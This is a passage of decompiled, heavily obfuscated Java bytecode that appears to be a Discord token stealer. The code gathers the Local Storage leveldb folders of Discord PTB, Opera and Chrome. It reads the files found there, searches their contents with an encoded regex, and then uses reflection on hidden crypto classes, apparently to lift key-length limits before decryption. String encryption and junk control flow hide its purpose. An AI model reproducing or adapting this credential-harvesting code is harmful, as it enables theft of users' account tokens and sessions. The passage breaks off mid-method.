    //   453: aload #138
    //   455: invokestatic getProperty : (Ljava/lang/String;)Ljava/lang/String;
    //   458: astore #139
    //   460: aload #87
    //   462: aload #139
    //   464: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   467: astore #88
    //   469: ldc_w '\AppData\Roaming\discordptb\Local Storage\leveldb'
    //   472: astore #140
    //   474: aload #88
    //   476: aload #140
    //   478: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   481: astore #89
    //   483: aload #89
    //   485: invokevirtual toString : ()Ljava/lang/String;
    //   488: astore #90
    //   490: aload #6
    //   492: aload #90
    //   494: invokevirtual add : (Ljava/lang/Object;)Z
    //   497: istore #9
    //   499: new java/lang/StringBuilder
    //   502: astore #91
    //   504: aload #91
    //   506: invokespecial <init> : ()V
    //   509: ldc_w 'TAx6P0IqekZD'
    //   512: iload #168
    //   514: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   517: astore #141
    //   519: aload #141
    //   521: invokestatic getProperty : (Ljava/lang/String;)Ljava/lang/String;
    //   524: astore #142
    //   526: aload #91
    //   528: aload #142
    //   530: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   533: astore #92
    //   535: ldc_w '\AppData\Roaming\Opera Software\Opera Stable\Local Storage\leveldb'
    //   538: astore #143
    //   540: aload #92
    //   542: aload #143
    //   544: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   547: astore #93
    //   549: aload #93
    //   551: invokevirtual toString : ()Ljava/lang/String;
    //   554: astore #94
    //   556: aload #6
    //   558: aload #94
    //   560: invokevirtual add : (Ljava/lang/Object;)Z
    //   563: istore #10
    //   565: new java/lang/StringBuilder
    //   568: astore #95
    //   570: aload #95
    //   572: invokespecial <init> : ()V
    //   575: ldc_w 'TAx6P0IqekZD'
    //   578: iload #168
    //   580: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   583: astore #144
    //   585: aload #144
    //   587: invokestatic getProperty : (Ljava/lang/String;)Ljava/lang/String;
    //   590: astore #145
    //   592: aload #95
    //   594: aload #145
    //   596: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   599: astore #96
    //   601: ldc_w '\AppData\Local\Google\Chrome\User Data\Default\Local Storage\leveldb'
    //   604: astore #146
    //   606: aload #96
    //   608: aload #146
    //   610: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   613: astore #97
    //   615: aload #97
    //   617: invokevirtual toString : ()Ljava/lang/String;
    //   620: astore #98
    //   622: aload #6
    //   624: aload #98
    //   626: invokevirtual add : (Ljava/lang/Object;)Z
    //   629: istore #11
    //   631: aload #6
    //   633: invokevirtual iterator : ()Ljava/util/Iterator;
    //   636: astore #12
    //   638: iload #168
    //   640: bipush #31
    //   642: imul
    //   643: iconst_4
    //   644: iushr
    //   645: iload #168
    //   647: irem
    //   648: iload #168
    //   650: bipush #16
    //   652: iushr
    //   653: ixor
    //   654: ldc_w 8801140
    //   657: if_icmpne -> 671
    //   660: ldc_w 708526350
    //   663: iload #168
    //   665: ixor
    //   666: istore #168
    //   668: goto -> 681
    //   671: new java/lang/IllegalAccessException
    //   674: astore_3
    //   675: aload_3
    //   676: invokespecial <init> : ()V
    //   679: aload_3
    //   680: athrow
    //   681: iload #168
    //   683: ldc_w 1444904068
    //   686: iload #168
    //   688: ixor
    //   689: imul
    //   690: ldc_w 1444904095
    //   693: iload #168
    //   695: ixor
    //   696: iushr
    //   697: iload #168
    //   699: irem
    //   700: iload #168
    //   702: ldc_w 1444904075
    //   705: iload #168
    //   707: ixor
    //   708: iushr
    //   709: ixor
    //   710: ldc_w 1354902504
    //   713: iload #168
    //   715: ixor
    //   716: if_icmpeq -> 743
    //   719: aconst_null
    //   720: athrow
    //   721: nop
    //   722: nop
    //   723: nop
    //   724: nop
    //   725: nop
    //   726: nop
    //   727: nop
    //   728: nop
    //   729: nop
    //   730: nop
    //   731: nop
    //   732: nop
    //   733: nop
    //   734: nop
    //   735: nop
    //   736: nop
    //   737: nop
    //   738: nop
    //   739: nop
    //   740: nop
    //   741: nop
    //   742: athrow
    //   743: new java/lang/RuntimeException
    //   746: dup
    //   747: invokespecial <init> : ()V
    //   750: athrow
    //   751: nop
    //   752: nop
    //   753: nop
    //   754: nop
    //   755: nop
    //   756: nop
    //   757: nop
    //   758: nop
    //   759: nop
    //   760: nop
    //   761: nop
    //   762: nop
    //   763: nop
    //   764: nop
    //   765: nop
    //   766: nop
    //   767: nop
    //   768: nop
    //   769: nop
    //   770: nop
    //   771: nop
    //   772: athrow
    //   773: nop
    //   774: nop
    //   775: nop
    //   776: athrow
    //   777: nop
    //   778: nop
    //   779: nop
    //   780: nop
    //   781: nop
    //   782: athrow
    //   783: iload #168
    //   785: bipush #7
    //   787: bipush #29
    //   789: ishl
    //   790: iand
    //   791: bipush #29
    //   793: ishr
    //   794: iload #168
    //   796: iconst_3
    //   797: ishl
    //   798: ior
    //   799: lookupswitch default -> 846, -1325669158 -> 835, 406396233 -> 824
    //   824: ldc_w 654363565
    //   827: iload #168
    //   829: ixor
    //   830: istore #168
    //   832: goto -> 858
    //   835: ldc_w 1377342623
    //   838: iload #168
    //   840: ixor
    //   841: istore #168
    //   843: goto -> 858
    //   846: new java/lang/RuntimeException
    //   849: astore_3
    //   850: aload_3
    //   851: ldc 'Error in hash'
    //   853: invokespecial <init> : (Ljava/lang/String;)V
    //   856: aload_3
    //   857: athrow
    //   858: pop
    //   859: iload #168
    //   861: bipush #31
    //   863: imul
    //   864: iconst_4
    //   865: iushr
    //   866: iload #168
    //   868: irem
    //   869: iload #168
    //   871: bipush #16
    //   873: iushr
    //   874: ixor
    //   875: ldc_w 63401348
    //   878: if_icmpne -> 7321
    //   881: ldc_w 1542488473
    //   884: iload #168
    //   886: ixor
    //   887: istore #168
    //   889: aload #12
    //   891: invokeinterface hasNext : ()Z
    //   896: istore #13
    //   898: iload #13
    //   900: ldc_w 1610049949
    //   903: iload #168
    //   905: ixor
    //   906: if_icmpeq -> 7269
    //   909: iload #168
    //   911: bipush #31
    //   913: imul
    //   914: iconst_4
    //   915: iushr
    //   916: iload #168
    //   918: irem
    //   919: iload #168
    //   921: bipush #16
    //   923: iushr
    //   924: ixor
    //   925: ldc_w 166658903
    //   928: if_icmpne -> 7311
    //   931: ldc_w 1200659351
    //   934: iload #168
    //   936: ixor
    //   937: istore #168
    //   939: iload #168
    //   941: ldc_w 409465365
    //   944: iload #168
    //   946: ixor
    //   947: imul
    //   948: ldc_w 409465358
    //   951: iload #168
    //   953: ixor
    //   954: iushr
    //   955: iload #168
    //   957: irem
    //   958: iload #168
    //   960: ldc_w 409465370
    //   963: iload #168
    //   965: ixor
    //   966: iushr
    //   967: ixor
    //   968: ldc_w 388927134
    //   971: iload #168
    //   973: ixor
    //   974: if_icmpeq -> 1001
    //   977: aconst_null
    //   978: athrow
    //   979: nop
    //   980: nop
    //   981: nop
    //   982: nop
    //   983: nop
    //   984: nop
    //   985: nop
    //   986: nop
    //   987: nop
    //   988: nop
    //   989: nop
    //   990: nop
    //   991: nop
    //   992: nop
    //   993: nop
    //   994: nop
    //   995: nop
    //   996: nop
    //   997: nop
    //   998: nop
    //   999: nop
    //   1000: athrow
    //   1001: new java/lang/RuntimeException
    //   1004: dup
    //   1005: invokespecial <init> : ()V
    //   1008: athrow
    //   1009: nop
    //   1010: nop
    //   1011: nop
    //   1012: nop
    //   1013: nop
    //   1014: nop
    //   1015: nop
    //   1016: nop
    //   1017: nop
    //   1018: nop
    //   1019: nop
    //   1020: nop
    //   1021: nop
    //   1022: nop
    //   1023: nop
    //   1024: nop
    //   1025: nop
    //   1026: nop
    //   1027: nop
    //   1028: nop
    //   1029: nop
    //   1030: athrow
    //   1031: iload #168
    //   1033: bipush #7
    //   1035: bipush #29
    //   1037: ishl
    //   1038: iand
    //   1039: bipush #29
    //   1041: ishr
    //   1042: iload #168
    //   1044: iconst_3
    //   1045: ishl
    //   1046: ior
    //   1047: lookupswitch default -> 7237, -1973048400 -> 1072, -1019244464 -> 1083
    //   1072: ldc_w 1795980455
    //   1075: iload #168
    //   1077: ixor
    //   1078: istore #168
    //   1080: goto -> 1091
    //   1083: ldc_w 1646738395
    //   1086: iload #168
    //   1088: ixor
    //   1089: istore #168
    //   1091: pop
    //   1092: iload #168
    //   1094: bipush #31
    //   1096: imul
    //   1097: iconst_4
    //   1098: iushr
    //   1099: iload #168
    //   1101: irem
    //   1102: iload #168
    //   1104: bipush #16
    //   1106: iushr
    //   1107: ixor
    //   1108: ldc_w 215874884
    //   1111: if_icmpne -> 6093
    //   1114: ldc_w 1902699318
    //   1117: iload #168
    //   1119: ixor
    //   1120: istore #168
    //   1122: aload #12
    //   1124: invokeinterface next : ()Ljava/lang/Object;
    //   1129: astore #14
    //   1131: aload #14
    //   1133: checkcast java/lang/String
    //   1136: astore #15
    //   1138: new java/io/File
    //   1141: astore #16
    //   1143: aload #16
    //   1145: aload #15
    //   1147: invokespecial <init> : (Ljava/lang/String;)V
    //   1150: aload #16
    //   1152: invokevirtual listFiles : ()[Ljava/io/File;
    //   1155: astore #17
    //   1157: aload #17
    //   1159: ifnonnull -> 1195
    //   1162: iload #168
    //   1164: bipush #31
    //   1166: imul
    //   1167: iconst_4
    //   1168: iushr
    //   1169: iload #168
    //   1171: irem
    //   1172: iload #168
    //   1174: bipush #16
    //   1176: iushr
    //   1177: ixor
    //   1178: ldc_w 94230583
    //   1181: if_icmpne -> 7227
    //   1184: ldc_w 613593590
    //   1187: iload #168
    //   1189: ixor
    //   1190: istore #168
    //   1192: goto -> 5689
    //   1195: ldc_w 779142935
    //   1198: iload #168
    //   1200: ixor
    //   1201: istore #168
    //   1203: aload #17
    //   1205: arraylength
    //   1206: istore #18
    //   1208: ldc_w 626585072
    //   1211: iload #168
    //   1213: ixor
    //   1214: i2b
    //   1215: istore #19
    //   1217: iload #168
    //   1219: bipush #31
    //   1221: imul
    //   1222: iconst_4
    //   1223: iushr
    //   1224: iload #168
    //   1226: irem
    //   1227: iload #168
    //   1229: bipush #16
    //   1231: iushr
    //   1232: ixor
    //   1233: ldc_w 140273753
    //   1236: if_icmpne -> 7123
    //   1239: ldc_w 1632975992
    //   1242: iload #168
    //   1244: ixor
    //   1245: istore #168
    //   1247: iload #168
    //   1249: ldc_w 1141756311
    //   1252: iload #168
    //   1254: ixor
    //   1255: imul
    //   1256: ldc_w 1141756300
    //   1259: iload #168
    //   1261: ixor
    //   1262: iushr
    //   1263: iload #168
    //   1265: irem
    //   1266: iload #168
    //   1268: ldc_w 1141756312
    //   1271: iload #168
    //   1273: ixor
    //   1274: iushr
    //   1275: ixor
    //   1276: ldc_w 1205293170
    //   1279: iload #168
    //   1281: ixor
    //   1282: if_icmpeq -> 1309
    //   1285: aconst_null
    //   1286: athrow
    //   1287: nop
    //   1288: nop
    //   1289: nop
    //   1290: nop
    //   1291: nop
    //   1292: nop
    //   1293: nop
    //   1294: nop
    //   1295: nop
    //   1296: nop
    //   1297: nop
    //   1298: nop
    //   1299: nop
    //   1300: nop
    //   1301: nop
    //   1302: nop
    //   1303: nop
    //   1304: nop
    //   1305: nop
    //   1306: nop
    //   1307: nop
    //   1308: athrow
    //   1309: new java/io/IOException
    //   1312: dup
    //   1313: invokespecial <init> : ()V
    //   1316: athrow
    //   1317: nop
    //   1318: nop
    //   1319: nop
    //   1320: nop
    //   1321: nop
    //   1322: nop
    //   1323: nop
    //   1324: nop
    //   1325: nop
    //   1326: nop
    //   1327: nop
    //   1328: nop
    //   1329: nop
    //   1330: nop
    //   1331: nop
    //   1332: nop
    //   1333: nop
    //   1334: nop
    //   1335: nop
    //   1336: nop
    //   1337: nop
    //   1338: athrow
    //   1339: iload #168
    //   1341: bipush #7
    //   1343: bipush #29
    //   1345: ishl
    //   1346: iand
    //   1347: bipush #29
    //   1349: ishr
    //   1350: iload #168
    //   1352: iconst_3
    //   1353: ishl
    //   1354: ior
    //   1355: lookupswitch default -> 6123, -1209490799 -> 1380, 544115778 -> 1391
    //   1380: ldc_w 1469245097
    //   1383: iload #168
    //   1385: ixor
    //   1386: istore #168
    //   1388: goto -> 1399
    //   1391: ldc_w 627188595
    //   1394: iload #168
    //   1396: ixor
    //   1397: istore #168
    //   1399: pop
    //   1400: iload #168
    //   1402: bipush #31
    //   1404: imul
    //   1405: iconst_4
    //   1406: iushr
    //   1407: iload #168
    //   1409: irem
    //   1410: iload #168
    //   1412: bipush #16
    //   1414: iushr
    //   1415: ixor
    //   1416: ldc_w 214468521
    //   1419: if_icmpne -> 6135
    //   1422: ldc_w 166358791
    //   1425: iload #168
    //   1427: ixor
    //   1428: istore #168
    //   1430: iload #19
    //   1432: iload #18
    //   1434: if_icmpge -> 5465
    //   1437: iload #168
    //   1439: bipush #31
    //   1441: imul
    //   1442: iconst_4
    //   1443: iushr
    //   1444: iload #168
    //   1446: irem
    //   1447: iload #168
    //   1449: bipush #16
    //   1451: iushr
    //   1452: ixor
    //   1453: ldc_w 176327325
    //   1456: if_icmpne -> 6145
    //   1459: ldc_w 701373388
    //   1462: iload #168
    //   1464: ixor
    //   1465: istore #168
    //   1467: iload #168
    //   1469: ldc_w 1095468591
    //   1472: iload #168
    //   1474: ixor
    //   1475: imul
    //   1476: ldc_w 1095468596
    //   1479: iload #168
    //   1481: ixor
    //   1482: iushr
    //   1483: iload #168
    //   1485: irem
    //   1486: iload #168
    //   1488: ldc_w 1095468576
    //   1491: iload #168
    //   1493: ixor
    //   1494: iushr
    //   1495: ixor
    //   1496: ldc_w 1338610822
    //   1499: iload #168
    //   1501: ixor
    //   1502: if_icmpeq -> 1529
    //   1505: aconst_null
    //   1506: athrow
    //   1507: nop
    //   1508: nop
    //   1509: nop
    //   1510: nop
    //   1511: nop
    //   1512: nop
    //   1513: nop
    //   1514: nop
    //   1515: nop
    //   1516: nop
    //   1517: nop
    //   1518: nop
    //   1519: nop
    //   1520: nop
    //   1521: nop
    //   1522: nop
    //   1523: nop
    //   1524: nop
    //   1525: nop
    //   1526: nop
    //   1527: nop
    //   1528: athrow
    //   1529: new java/lang/RuntimeException
    //   1532: dup
    //   1533: invokespecial <init> : ()V
    //   1536: athrow
    //   1537: nop
    //   1538: nop
    //   1539: nop
    //   1540: nop
    //   1541: nop
    //   1542: nop
    //   1543: nop
    //   1544: nop
    //   1545: nop
    //   1546: nop
    //   1547: nop
    //   1548: nop
    //   1549: nop
    //   1550: nop
    //   1551: nop
    //   1552: nop
    //   1553: nop
    //   1554: nop
    //   1555: nop
    //   1556: nop
    //   1557: nop
    //   1558: athrow
    //   1559: iload #168
    //   1561: bipush #7
    //   1563: bipush #29
    //   1565: ishl
    //   1566: iand
    //   1567: bipush #29
    //   1569: ishr
    //   1570: iload #168
    //   1572: iconst_3
    //   1573: ishl
    //   1574: ior
    //   1575: lookupswitch default -> 6175, -61494087 -> 1611, 173814146 -> 1600
    //   1600: ldc_w 1372074590
    //   1603: iload #168
    //   1605: ixor
    //   1606: istore #168
    //   1608: goto -> 1619
    //   1611: ldc_w 789119481
    //   1614: iload #168
    //   1616: ixor
    //   1617: istore #168
    //   1619: pop
    //   1620: iload #168
    //   1622: bipush #31
    //   1624: imul
    //   1625: iconst_4
    //   1626: iushr
    //   1627: iload #168
    //   1629: irem
    //   1630: iload #168
    //   1632: bipush #16
    //   1634: iushr
    //   1635: ixor
    //   1636: ldc_w 268385558
    //   1639: if_icmpne -> 6187
    //   1642: ldc_w 234942032
    //   1645: iload #168
    //   1647: ixor
    //   1648: istore #168
    //   1650: aload #17
    //   1652: iload #19
    //   1654: aaload
    //   1655: astore #20
    //   1657: iload #168
    //   1659: bipush #31
    //   1661: imul
    //   1662: iconst_4
    //   1663: iushr
    //   1664: iload #168
    //   1666: irem
    //   1667: iload #168
    //   1669: bipush #16
    //   1671: iushr
    //   1672: ixor
    //   1673: ldc_w 186540123
    //   1676: if_icmpne -> 7061
    //   1679: ldc_w 106195862
    //   1682: iload #168
    //   1684: ixor
    //   1685: istore #168
    //   1687: iload #168
    //   1689: ldc_w 416756151
    //   1692: iload #168
    //   1694: ixor
    //   1695: imul
    //   1696: ldc_w 416756140
    //   1699: iload #168
    //   1701: ixor
    //   1702: iushr
    //   1703: iload #168
    //   1705: irem
    //   1706: iload #168
    //   1708: ldc_w 416756152
    //   1711: iload #168
    //   1713: ixor
    //   1714: iushr
    //   1715: ixor
    //   1716: ldc_w 418896202
    //   1719: iload #168
    //   1721: ixor
    //   1722: if_icmpeq -> 1749
    //   1725: aconst_null
    //   1726: athrow
    //   1727: nop
    //   1728: nop
    //   1729: nop
    //   1730: nop
    //   1731: nop
    //   1732: nop
    //   1733: nop
    //   1734: nop
    //   1735: nop
    //   1736: nop
    //   1737: nop
    //   1738: nop
    //   1739: nop
    //   1740: nop
    //   1741: nop
    //   1742: nop
    //   1743: nop
    //   1744: nop
    //   1745: nop
    //   1746: nop
    //   1747: nop
    //   1748: athrow
    //   1749: new java/lang/IllegalAccessException
    //   1752: dup
    //   1753: invokespecial <init> : ()V
    //   1756: athrow
    //   1757: nop
    //   1758: nop
    //   1759: nop
    //   1760: nop
    //   1761: nop
    //   1762: nop
    //   1763: nop
    //   1764: nop
    //   1765: nop
    //   1766: nop
    //   1767: nop
    //   1768: nop
    //   1769: nop
    //   1770: nop
    //   1771: nop
    //   1772: nop
    //   1773: nop
    //   1774: nop
    //   1775: nop
    //   1776: nop
    //   1777: nop
    //   1778: athrow
    //   1779: iload #168
    //   1781: bipush #7
    //   1783: bipush #29
    //   1785: ishl
    //   1786: iand
    //   1787: bipush #29
    //   1789: ishr
    //   1790: iload #168
    //   1792: iconst_3
    //   1793: ishl
    //   1794: ior
    //   1795: lookupswitch default -> 6197, -960918208 -> 1831, 1525641536 -> 1820
    //   1820: ldc_w 58693154
    //   1823: iload #168
    //   1825: ixor
    //   1826: istore #168
    //   1828: goto -> 1839
    //   1831: ldc_w 284510626
    //   1834: iload #168
    //   1836: ixor
    //   1837: istore #168
    //   1839: pop
    //   1840: iload #168
    //   1842: bipush #31
    //   1844: imul
    //   1845: iconst_4
    //   1846: iushr
    //   1847: iload #168
    //   1849: irem
    //   1850: iload #168
    //   1852: bipush #16
    //   1854: iushr
    //   1855: ixor
    //   1856: ldc_w 127948971
    //   1859: if_icmpne -> 7031
    //   1862: ldc_w 1099183016
    //   1865: iload #168
    //   1867: ixor
    //   1868: istore #168
    //   1870: aload #20
    //   1872: invokevirtual getName : ()Ljava/lang/String;
    //   1875: astore #21
    //   1877: ldc_w 'FBFwKA=='
    //   1880: iload #168
    //   1882: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   1885: astore #99
    //   1887: aload #21
    //   1889: aload #99
    //   1891: invokevirtual endsWith : (Ljava/lang/String;)Z
    //   1894: istore #22
    //   1896: iload #22
    //   1898: ldc_w 1235635106
    //   1901: iload #168
    //   1903: ixor
    //   1904: if_icmpne -> 4244
    //   1907: iload #168
    //   1909: bipush #31
    //   1911: imul
    //   1912: iconst_4
    //   1913: iushr
    //   1914: iload #168
    //   1916: irem
    //   1917: iload #168
    //   1919: bipush #16
    //   1921: iushr
    //   1922: ixor
    //   1923: ldc_w 246577967
    //   1926: if_icmpne -> 7021
    //   1929: ldc_w 922187330
    //   1932: iload #168
    //   1934: ixor
    //   1935: istore #168
    //   1937: goto -> 4441
    //   1940: aload #20
    //   1942: invokevirtual getName : ()Ljava/lang/String;
    //   1945: astore #23
    //   1947: ldc_w 'FBVwKw=='
    //   1950: iload #168
    //   1952: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   1955: astore #100
    //   1957: aload #23
    //   1959: aload #100
    //   1961: invokevirtual endsWith : (Ljava/lang/String;)Z
    //   1964: istore #24
    //   1966: iload #24
    //   1968: ldc_w 1683431487
    //   1971: iload #168
    //   1973: ixor
    //   1974: if_icmpeq -> 5016
    //   1977: iload #168
    //   1979: bipush #31
    //   1981: imul
    //   1982: iconst_4
    //   1983: iushr
    //   1984: iload #168
    //   1986: irem
    //   1987: iload #168
    //   1989: bipush #16
    //   1991: iushr
    //   1992: ixor
    //   1993: ldc_w 40413741
    //   1996: if_icmpne -> 6375
    //   1999: ldc_w 1610923243
    //   2002: iload #168
    //   2004: ixor
    //   2005: istore #168
    //   2007: goto -> 3469
    //   2010: new java/io/FileReader
    //   2013: astore #25
    //   2015: aload #25
    //   2017: aload #20
    //   2019: invokespecial <init> : (Ljava/io/File;)V
    //   2022: new java/io/BufferedReader
    //   2025: astore #26
    //   2027: aload #26
    //   2029: aload #25
    //   2031: invokespecial <init> : (Ljava/io/Reader;)V
    //   2034: new java/lang/StringBuilder
    //   2037: astore #27
    //   2039: aload #27
    //   2041: invokespecial <init> : ()V
    //   2044: iload #168
    //   2046: bipush #31
    //   2048: imul
    //   2049: iconst_4
    //   2050: iushr
    //   2051: iload #168
    //   2053: irem
    //   2054: iload #168
    //   2056: bipush #16
    //   2058: iushr
    //   2059: ixor
    //   2060: ldc_w 248210490
    //   2063: if_icmpne -> 6209
    //   2066: ldc_w 1219982987
    //   2069: iload #168
    //   2071: ixor
    //   2072: istore #168
    //   2074: goto -> 3845
    //   2077: aload #26
    //   2079: invokevirtual readLine : ()Ljava/lang/String;
    //   2082: astore #28
    //   2084: aload #28
    //   2086: ifnull -> 4233
    //   2089: iload #168
    //   2091: bipush #31
    //   2093: imul
    //   2094: iconst_4
    //   2095: iushr
    //   2096: iload #168
    //   2098: irem
    //   2099: iload #168
    //   2101: bipush #16
    //   2103: iushr
    //   2104: ixor
    //   2105: ldc_w 102506554
    //   2108: if_icmpne -> 6355
    //   2111: ldc_w 181059298
    //   2114: iload #168
    //   2116: ixor
    //   2117: istore #168
    //   2119: goto -> 4629
    //   2122: aload #27
    //   2124: aload #28
    //   2126: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   2129: astore #78
    //   2131: iload #168
    //   2133: bipush #31
    //   2135: imul
    //   2136: iconst_4
    //   2137: iushr
    //   2138: iload #168
    //   2140: irem
    //   2141: iload #168
    //   2143: bipush #16
    //   2145: iushr
    //   2146: ixor
    //   2147: ldc_w 37942899
    //   2150: if_icmpne -> 6365
    //   2153: ldc_w 1166565308
    //   2156: iload #168
    //   2158: ixor
    //   2159: istore #168
    //   2161: goto -> 3657
    //   2164: aload #25
    //   2166: invokevirtual close : ()V
    //   2169: aload #26
    //   2171: invokevirtual close : ()V
    //   2174: ldc_w 'ERhAMVgzJ3BBUgx7DkAyZ3ouKUsvFjgRE1JPEEwdTnoCV0IB'
    //   2177: iload #168
    //   2179: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   2182: astore #29
    //   2184: aload #29
    //   2186: invokestatic compile : (Ljava/lang/String;)Ljava/util/regex/Pattern;
    //   2189: astore #30
    //   2191: aload #27
    //   2193: invokevirtual toString : ()Ljava/lang/String;
    //   2196: astore #101
    //   2198: aload #30
    //   2200: aload #101
    //   2202: invokevirtual matcher : (Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;
    //   2205: astore #31
    //   2207: aload #31
    //   2209: invokevirtual find : ()Z
    //   2212: istore #32
    //   2214: iload #32
    //   2216: ldc_w 236972244
    //   2219: iload #168
    //   2221: ixor
    //   2222: if_icmpeq -> 5005
    //   2225: iload #168
    //   2227: bipush #31
    //   2229: imul
    //   2230: iconst_4
    //   2231: iushr
    //   2232: iload #168
    //   2234: irem
    //   2235: iload #168
    //   2237: bipush #16
    //   2239: iushr
    //   2240: ixor
    //   2241: ldc_w 190700805
    //   2244: if_icmpne -> 6303
    //   2247: ldc_w 551204133
    //   2250: iload #168
    //   2252: ixor
    //   2253: istore #168
    //   2255: goto -> 4044
    //   2258: ldc_w 'czhD'
    //   2261: iload #168
    //   2263: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   2266: astore #33
    //   2268: aload #33
    //   2270: invokestatic getMaxAllowedKeyLength : (Ljava/lang/String;)I
    //   2273: istore #34
    //   2275: ldc_w 927993923
    //   2278: iload #168
    //   2280: ixor
    //   2281: i2s
    //   2282: istore #102
    //   2284: iload #34
    //   2286: iload #102
    //   2288: if_icmpge -> 4033
    //   2291: iload #168
    //   2293: bipush #31
    //   2295: imul
    //   2296: iconst_4
    //   2297: iushr
    //   2298: iload #168
    //   2300: irem
    //   2301: iload #168
    //   2303: bipush #16
    //   2305: iushr
    //   2306: ixor
    //   2307: ldc_w 187373089
    //   2310: if_icmpne -> 6865
    //   2313: ldc_w 1582122936
    //   2316: iload #168
    //   2318: ixor
    //   2319: istore #168
    //   2321: goto -> 4255
    //   2324: ldc_w 'VRhmLRRtfVJbfB5EECpvRVNwalMZV0BdSxF+OB4ocEpkZQNAXAtrVEhv'
    //   2327: iload #168
    //   2329: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   2332: astore #35
    //   2334: aload #35
    //   2336: invokestatic forName : (Ljava/lang/String;)Ljava/lang/Class;
    //   2339: astore #36
    //   2341: ldc_w 467375230
    //   2344: iload #168
    //   2346: ixor
    //   2347: i2b
    //   2348: istore #103
    //   2350: iload #103
    //   2352: anewarray java/lang/Class
    //   2355: astore #104
    //   2357: aload #36
    //   2359: aload #104
    //   2361: invokevirtual getDeclaredConstructor : ([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;
    //   2364: astore #37
    //   2366: ldc_w 467375231
    //   2369: iload #168
    //   2371: ixor
    //   2372: i2b
    //   2373: istore #105
    //   2375: aload #37
    //   2377: iload #105
    //   2379: invokevirtual setAccessible : (Z)V
    //   2382: ldc_w 467375230
    //   2385: iload #168
    //   2387: ixor
    //   2388: i2b
    //   2389: istore #106
    //   2391: iload #106
    //   2393: anewarray java/lang/Object
    //   2396: astore #107
    //   2398: aload #37
    //   2400: aload #107
    //   2402: invokevirtual newInstance : ([Ljava/lang/Object;)Ljava/lang/Object;
    //   2405: astore #38
    //   2407: ldc_w 'XhV8Ew0vck9VaQ4='
    //   2410: iload #168
    //   2412: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   2415: astore #108
    //   2417: aload #36
    //   2419: aload #108
    //   2421: invokevirtual getDeclaredField : (Ljava/lang/String;)Ljava/lang/reflect/Field;
    //   2424: astore #39
    //   2426: ldc_w 467375231
    //   2429: iload #168
    //   2431: ixor
    //   2432: i2b
    //   2433: istore #109
    //   2435: aload #39
    //   2437: iload #109
    //   2439: invokevirtual setAccessible : (Z)V
    //   2442: ldc_w 467375231
    //   2445: iload #168
    //   2447: ixor
    //   2448: i2b
    //   2449: istore #147
    //   2451: aload #39
    //   2453: aload #38
    //   2455: iload #147
    //   2457: invokevirtual setBoolean : (Ljava/lang/Object;Z)V
    //   2460: ldc_w 'VRhmLRRtfVJbfB5EECpvRVNwakIQSX1RSg9+JAMy'
    //   2463: iload #168
    //   2465: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   2468: astore #40
    //   2470: aload #40
    //   2472: invokestatic forName : (Ljava/lang/String;)Ljava/lang/Class;
    //   2475: astore #41
    //   2477: ldc_w 467375230
    //   2480: iload #168
    //   2482: ixor
    //   2483: i2b
    //   2484: istore #110
    //   2486: iload #110
    //   2488: anewarray java/lang/Class
    //   2491: astore #111
    //   2493: aload #41
    //   2495: aload #111
    //   2497: invokevirtual getDeclaredConstructor : ([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;
    //   2500: astore #42
    //   2502: ldc_w 467375231
    //   2505: iload #168
    //   2507: ixor
    //   2508: i2b
    //   2509: istore #112
    //   2511: aload #42
    //   2513: iload #112
    //   2515: invokevirtual setAccessible : (Z)V
    //   2518: ldc_w 467375230
    //   2521: iload #168
    //   2523: ixor
    //   2524: i2b
    //   2525: istore #113
    //   2527: iload #113
    //   2529: anewarray java/lang/Object
    //   2532: astore #114
    //   2534: aload #42
    //   2536: aload #114
    //   2538: invokevirtual newInstance : ([Ljava/lang/Object;)Ljava/lang/Object;
    //   2541: astore #43
    //   2543: ldc_w 'TxxiIR8='
    //   2546: iload #168
    //   2548: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   2551: astore #115
    //   2553: aload #41
    //   2555: aload #115
    //   2557: invokevirtual getDeclaredField : (Ljava/lang/String;)Ljava/lang/reflect/Field;
    //   2560: astore #44
    //   2562: ldc_w 467375231
    //   2565: iload #168
    //   2567: ixor
    //   2568: i2b
    //   2569: istore #116
    //   2571: aload #44
    //   2573: iload #116
    //   2575: invokevirtual setAccessible : (Z)V
    //   2578: aload #44
    //   2580: aload #43
    //   2582: invokevirtual get : (Ljava/lang/Object;)Ljava/lang/Object;
    //   2585: astore #45
    //   2587: aload #45
    //   2589: checkcast java/util/Map
    //   2592: astore #46
    //   2594: ldc_w 'FQ=='
    //   2597: iload #168
    //   2599: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   2602: astore #117
    //   2604: aload #46
    //   2606: aload #117
    //   2608: aload #38
    //   2610: invokeinterface put : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    //   2615: astore #47
    //   2617: ldc_w 'VRhmLRRtfVJbfB5EECN+WXBhZmcHUmRBdB15KgokbQ=='
    //   2620: iload #168
    //   2622: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   2625: astore #48
    //   2627: aload #48
